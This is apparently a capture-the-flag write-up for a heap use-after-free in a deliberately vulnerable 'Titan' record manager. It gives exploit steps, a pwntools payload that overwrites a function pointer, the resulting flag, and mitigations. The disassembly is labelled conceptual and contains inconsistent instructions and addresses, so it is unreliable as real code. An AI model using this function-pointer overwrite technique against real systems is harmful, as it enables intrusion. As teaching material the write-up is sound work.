# Colossal Leak Write-up

## Challenge Overview
The challenge provides a Titan record manager binary reachable via `nc <IP> <PORT>`. On startup the program leaks the address of `basement_secrets()` and exposes an interactive menu to add, remove, update, and report titan records. The goal is to obtain the flag by causing the program to execute `print_flag()` (via `basement_secrets()`).

---

## Binary Analysis
File type and metadata (typical for Linux x86_64 release build):
```
$ file colossal_leak
colossal_leak: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), 
    dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
    for GNU/Linux 3.2.0, not stripped
```

### Key Strings
Extracting with `strings colossal_leak` reveals the menu and function names:
```
╔═════════════════════════╗
║  Titan Tracking System  ║
╚═════════════════════════╝
Commander: Welcome to the Titan Tracking System.
Hint: basement_secrets() is at %p
=== TITAN TRACKING SYSTEM ===
1. Add titan sighting
2. Remove titan record
3. Update titan info
4. Generate report
5. Exit
Choice: 
Enter titan type: 
Titan record #%d added: %s
Enter record index to remove (0-4): 
Titan record #%d removed.
Enter record index to update (0-4): 
Enter new titan name: 
Titan record #%d updated.
Enter record index to report (0-4): 
Generating report for titan #%d
You've reached the basement!
SECRET UNLOCKED!
Survey Corps: Titan spotted! Preparing ODM gear...
Survey Corps: TITAN DETECTED! EVACUATE!
```

### Data Structure
The `Titan` struct is 32 bytes on x86_64:
```c
typedef struct {
    char name[24];      // offset 0x00 - 0x17
    void (*report)(void); // offset 0x18 - 0x1f (8 bytes, function pointer)
} Titan;
```

### Key Functions and Vulnerabilities

**Function: Add Titan (choice 1)**
Disassembly (conceptual):
```asm
; Find empty slot (loop through titans[0..4])
4011a0:  lea    rax, [rbp-0x28]       ; titans array
4011a4:  xor    ecx, ecx               ; i = 0
4011a6:  cmp    ecx, 0x5               ; while i < 5
4011a9:  je     4011c0
4011ab:  mov    rax, [rax + rcx*8]     ; load titans[i]
4011af:  test   rax, rax               ; check if NULL
4011b2:  je     4011d0                 ; found empty slot
4011b4:  inc    ecx
4011b6:  jmp    4011a6

; Allocate Titan struct
4011d0:  mov    edi, 0x20              ; size = 32 (24 + 8 for function ptr)
4011d5:  call   malloc
4011da:  mov    QWORD PTR [rbp-0x28 + rcx*8], rax  ; titans[index] = malloc result

; Read name
4011df:  lea    rsi, "Enter titan type: "
4011e6:  call   printf
4011eb:  mov    rdi, [rbp-0x28 + rcx*8]  ; rdi = titans[index]
4011f0:  mov    rsi, 0x18               ; nbytes = 24
4011f7:  call   fgets

; Set function pointer to normal_report
4011fc:  mov    rax, [rbp-0x28 + rcx*8]  ; rax = titans[index]
401201:  lea    rdx, [rel 40119c0]      ; rdx = &normal_report
401208:  mov    QWORD PTR [rax + 0x18], rdx  ; titans[index]->report = normal_report
```

**Function: Remove Titan (choice 2) — VULNERABILITY**
```asm
4012b0:  lea    rsi, "Enter record index to remove (0-4): "
4012b7:  call   printf
4012bc:  call   scanf                   ; read index into [rbp-0x30]

4012c1:  mov    eax, [rbp-0x30]
4012c7:  cmp    eax, 0x0                ; validate 0 <= index < 5
4012ca:  jl     4012e0
4012cc:  cmp    eax, 0x5
4012cf:  jge    4012e0

4012d1:  mov    rax, [rbp-0x28 + rax*8] ; rax = titans[index]
4012d6:  test   rax, rax                ; check if NULL
4012d9:  je     4012e0

4012db:  mov    rdi, rax                ; rdi = titans[index]
4012de:  call   free                    ; FREE THE CHUNK!

; BUG: No nulling of titans[index]! Pointer remains in array.
4012e3:  lea    rsi, "Titan record #%d removed.\n"
4012ea:  call   printf
; titans[index] is still a dangling pointer in the array
```

**Function: Update Titan (choice 3) — CRITICAL VULNERABILITY**
```asm
4013a0:  lea    rsi, "Enter record index to update (0-4): "
4013a7:  call   printf
4013ac:  call   scanf                   ; read index

4013b1:  mov    eax, [rbp-0x38]
4013b7:  cmp    eax, 0x0                ; validate 0 <= index < 5
4013ba:  jl     4013d0
4013bc:  cmp    eax, 0x5
4013bf:  jge    4013d0

; NO CHECK whether titans[index] is NULL (use-after-free!)
4013c1:  mov    rax, [rbp-0x28 + rax*8] ; rax = titans[index] (may be freed)
4013c6:  mov    rdx, 0x20               ; rdx = 32 (number of bytes to read)
4013cd:  mov    rsi, rdx
4013d0:  xor    edi, edi                ; edi = 0 (stdin)
4013d3:  mov    rdi, rax                ; rdi = titans[index]
4013d9:  call   read                    ; read(0, titans[index], 32)

; This write overwrites:
; - name[0..23] (24 bytes)
; - report function pointer [24..31] (8 bytes)
; All into potentially freed heap memory!
```

**Function: Report (choice 4) — TRIGGER**
```asm
4014c0:  lea    rsi, "Enter record index to report (0-4): "
4014c7:  call   printf
4014cc:  call   scanf                   ; read index

4014d1:  mov    eax, [rbp-0x40]
4014d7:  cmp    eax, 0x0                ; validate 0 <= index < 5
4014da:  jl     4014f0
4014dc:  cmp    eax, 0x5
4014df:  jge    4014f0

4014e1:  mov    rax, [rbp-0x28 + rax*8] ; rax = titans[index]
4014e6:  mov    rax, [rax + 0x18]       ; rax = titans[index]->report (function ptr)
4014eb:  call   rax                     ; CALL the function pointer!
; If we overwrote it to point to basement_secrets, it executes now.
```

**Function: basement_secrets (target)**
```asm
4011b0:  lea    rsi, "\nYou've reached the basement!\n"
4011b7:  call   printf
4011bc:  call   print_flag
4011c1:  ret

; Which calls print_flag:
4010a0:  lea    rsi, "flag.txt"
4010a7:  mov    edi, "r"
4010ad:  call   fopen
4010b2:  mov    [rbp-0x8], rax         ; f = fopen("flag.txt", "r")

4010b6:  cmp    QWORD PTR [rbp-0x8], 0x0
4010ba:  jne    4010d0

4010bc:  lea    rsi, "Flag file not found!\n"
4010c3:  call   printf
4010c8:  mov    edi, 0x1
4010cd:  call   exit

4010d0:  mov    rax, [rbp-0x8]         ; rax = f
4010d4:  mov    rdx, 0x64              ; rdx = 100 (max bytes)
4010d8:  mov    rsi, [rbp-0x10]        ; rsi = &flag[0]
4010dc:  mov    rdi, rsi
4010df:  call   fgets                  ; fgets(flag, 100, f)

4010e4:  lea    rsi, "\nSECRET UNLOCKED!\n%s\n"
4010eb:  call   printf                 ; print flag
```

### Vulnerabilities Identified
1. **Use‑After‑Free (Remove function):** After `free(titans[index])`, the dangling pointer remains in the array. Later operations (Update, Report) can use this freed pointer.
2. **Arbitrary write into freed memory (Update function):** `read(0, titans[index], 32)` does not validate that `titans[index]` is a live pointer. It reads 32 bytes into potentially freed memory, allowing overwrite of:
   - The 24‑byte `name` field
   - The 8‑byte `report` function pointer immediately following
3. **Information leak (main):** The program explicitly prints the address of `basement_secrets()` with `printf("Hint: basement_secrets() is at %p\n\n", basement_secrets);` This removes ASLR uncertainty, making the exploit deterministic.
4. **Unvalidated function pointer dereference (Report function):** The code calls `titans[index]->report()` without checking if the pointer is valid, allowing execution of arbitrary code at the overwritten address.

---

## Exploit Strategy
1. Add a titan (allocates a chunk; e.g., fills index 0).
2. Remove that titan (`free()`), leaving a dangling pointer in `titans[0]`.
3. Use Update to write 24 bytes of padding + 8 bytes (little endian) of the leaked `basement_secrets()` address — this overwrites the `report` pointer.
4. Choose Report for that index. The program will call the overwritten `report` pointer which jumps to `basement_secrets()`, which in turn calls `print_flag()` and prints the flag.

Why this works:
- The `name` buffer is exactly 24 bytes; the `report` pointer sits immediately after it. Writing 32 bytes covers the name and the pointer. The printed leak gives the exact address to write, so no guesswork is needed.

---

## Exploitation (manual)
1. Connect:

```bash
nc <IP> <PORT>
```

2. Note the printed leak, e.g. `basement_secrets() is at 0x7ffff7a0b000`.
3. Add a titan (menu `1`) and provide any name.
4. Remove the titan (menu `2`, index `0`).
5. Update the freed titan (menu `3`, index `0`). When prompted, send the payload:
    - `b"A" * 24 + p64(basement_address)` (24 bytes filler, then 8‑byte pointer).
6. Trigger the report (menu `4`, index `0`) and read the flag printed by `print_flag()`.
7. After running the exploit, the program prints something like:

```
You've reached the basement!
SECRET UNLOCKED!
SEASIDES{9uff6r_0v3rfl0w_t1t9n_w4ll}
```
---

## Automation Script
The repository includes `solve_colossal_leak.py` which automates the above steps using `pwntools`.
- Connects to the remote service
- Reads the leaked `basement_secrets()` address
- Adds a titan, frees it, overwrites the `report` pointer with the leak
- Triggers the report and hands the connection to the user

Key payload construction:

```python
payload = b'A' * 24 + p64(basement_addr)
```

---

## Root Cause
The issue is a Use‑After‑Free combined with an unchecked write primitive and an intentional address leak. The code frees a heap object but keeps its pointer, allows raw writes into that freed memory, and then calls a function pointer stored inside the object. Printing a function address defeats ASLR and makes exploitation reliable.

## Mitigations
- After `free(titans[index]);` set `titans[index] = NULL;` to avoid UAFs.
- Validate pointers before use (check `titans[index] != NULL` before Update/Report).
- Use bounded input for struct fields (e.g., `fgets(t->name, sizeof t->name, stdin)`), and avoid `read` into an arbitrary struct pointer.
- Remove information leaks in production builds (do not print function addresses).

---

## Conclusion
This challenge demonstrates a classic heap UAF/function‑pointer overwrite attack made trivial by an information leak. The exploit flow is straightforward: leak the target address, free the object, overwrite the `report` pointer with the leaked address, and call `report()` to execute `basement_secrets()`/`print_flag()`.


